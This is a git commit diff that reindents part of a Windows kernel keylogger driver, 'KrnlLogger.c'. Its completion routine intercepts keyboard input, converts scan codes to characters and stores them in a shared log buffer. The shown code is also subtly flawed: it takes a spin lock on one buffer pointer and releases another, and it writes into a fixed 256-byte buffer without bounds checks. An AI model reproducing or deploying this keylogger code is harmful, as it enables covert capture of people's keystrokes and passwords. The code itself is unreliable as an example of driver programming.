fa3d22b2510475fd2b3e103fcfa89adc5b803a71
czashi <113217553+CZashi@users.noreply.github.com>
2022-11-20 03:14:10 +0100

    Update KrnlLogger.c

--- deprecated/kernel/KrnlLogger.c
+++ deprecated/kernel/KrnlLogger.c
@@ -1,7 +1,6 @@
 #include <ntddk.h>
 #include <Ntddkbd.h>
 
-
 typedef struct _OUT_BUFFER {
 	CHAR output[256];
 	INT index;
@@ -17,25 +16,26 @@ NTSTATUS KeyloggerCompletion(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Contex
 {
 	PKEYBOARD_INPUT_DATA pKeyInputData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
 	UINT InputCountInfo                = Irp->IoStatus.Information / sizeof( KEYBOARD_INPUT_DATA );
-  KIRQL kIrqlSil                     = KfAcquireSpinLock( &LogBuffer->BufferLock ); // shared buffer stucture lock
+        KIRQL kIrqlSil                     = KfAcquireSpinLock( &LogBuffer->BufferLock ); // shared buffer stucture lock
   
 	UINT i, j;
 	CompleteIrps--;
   
 	for ( i = 0 ; i < InputCountInfo ; i++ )
-  {	
+	{	
 	  if ( ! ( pKeyInputData[ i ].Flags & 1 ) )
-    {
-			for ( j = 0 ; j < 27 ; j++ ) 
-      {
-				if ( UpperScan[j] == pKeyInputData[ i ].MakeCode )
-        {
-					pLogBufferOutput->output[ pLogBufferOutput->index++ ] = UpperChar[j];
-					break;
-				}
-			}
-		}
+	  {
+	    for ( j = 0 ; j < 27 ; j++ ) 
+	    {
+	      if ( UpperScan[j] == pKeyInputData[ i ].MakeCode )
+	      {
+	          pLogBufferOutput->output[ pLogBufferOutput->index++ ] = UpperChar[j];
+		  break;
+	      }
+	    }
+	  }
 	}
+	
 	KfReleaseSpinLock( &pLogBufferOutput->BufferLock, kIrqlSil );
   
 	if ( Irp->PendingReturned ) IoMarkIrpPending( Irp );
